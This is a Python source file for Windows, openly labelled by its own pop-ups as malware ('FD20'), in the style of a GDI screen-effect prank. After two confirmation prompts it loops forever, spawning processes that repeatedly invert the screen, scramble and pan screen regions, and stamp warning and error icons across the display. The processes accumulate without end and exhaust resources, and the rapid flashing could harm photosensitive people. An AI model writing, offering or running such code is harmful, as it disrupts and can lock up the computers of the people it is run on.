import os
from time import time
from turtle import width
from win32api import *
from win32gui import *
from win32ui import * 
import ctypes
from ctypes import * 
from win32con import *
from win32file import *
from random import randrange as rd
from random import *
import random
import time
from sys import exit
import multiprocessing
import math
import win32con 
import win32gui
import win32api
import win32process

def running():

    if MessageBox("The software you just executed is considered malware. If you dont know what a  malware is,press simply No and nothing will happen. ", "FD20", MB_YESNO | MB_ICONWARNING) == 7:
     exit()
    if MessageBox("The creator Frank South 20 is not responsible for any damages made using this malware, still execute it?", "FD20", MB_YESNO | MB_ICONWARNING) == 7:
     exit()
	
    else:
        main()

IconWarning = LoadIcon(None, 32515)
IconError = LoadIcon(None, 32513)
 

  
def error_drawing():
    global time
    global timeSubstract
  
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [sw,sh] = [user32.GetSystemMetrics(0),user32.GetSystemMetrics(1)] 
    hdc = GetDC(0)
    while True:
        DrawIcon(hdc, rd(sh), rd(sh), IconWarning)
        for i in range(60, 900):
            mouseX,mouseY = GetCursorPos()
            DrawIcon(hdc, mouseX, mouseY, IconError)
            Sleep(6)

def screen_puzzle():
   
    user32 = ctypes.windll.user32
    [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
    hdc = GetDC(0) 
    x1 = rd(sw-100)
    y1 = rd(sh-70)
    x2 = rd(sw-400)
    y2 = rd(sw-400)

    width = rd(400)
    height = rd(600)
    while True:
       BitBlt(hdc, x1 -4, y1, width , height , hdc, x2 -20 , y2 -5, win32con.PATINVERT)
       Sleep(1400)

def screen_puzzle20():
   
    user32 = ctypes.windll.user32
    [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
    hdc = GetDC(0) 
    x1 = rd(sw-200)
    y1 = rd(sh-200)
    x2 = rd(sw-400)
    y2 = rd(sw-400)

    width = rd(600)
    height = rd(600)
    while True:
       BitBlt(hdc, x1 , y1, width , height , hdc , x2 , y2 , win32con.SRCCOPY)
       Sleep(20)
def mlt():
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [w, h] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
    hdc = win32gui.GetDC(0)
    while True:
  
       win32gui.InvertRect(hdc, (0, 0, w ,h))
       Sleep(1220)

def Pan_screen():
      user32 = ctypes.windll.user32
      user32.SetProcessDPIAware()
      [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
      hdc = win32gui.GetDC(0)
      dx = dy = 1
      angle = 0
      size = 1
      speed = 5

      while True:
    
          win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, dx, dy, win32con.SRCCOPY)
          dx = math.ceil(math.sin(angle) * size * 32)
          dy = math.ceil(math.cos(angle) * size * 32)
          angle += speed / 8
          if angle > math.pi :
             angle = math.pi * -1




def timer():
    time.sleep(20)

def main():
    while True:

    
        time_thread = multiprocessing.Process(target = timer)
        scrpuzzle = multiprocessing.Process(target = screen_puzzle)
        scrpuzzle20 = multiprocessing.Process(target = screen_puzzle20)
        drawing_thead = multiprocessing.Process(target = error_drawing)
        panscr = multiprocessing.Process(target = Pan_screen)
        blink = multiprocessing.Process(target = mlt)
     
        time_thread.start()        
      
      
         
     
    
        scrpuzzle.start()
        time.sleep(5)
        scrpuzzle20.start()     
        time.sleep(29)
        blink.start()
        time.sleep(10)
        drawing_thead.start() 
        time.sleep(10)
        panscr.start()
     




if __name__ == "__main__":
       running()














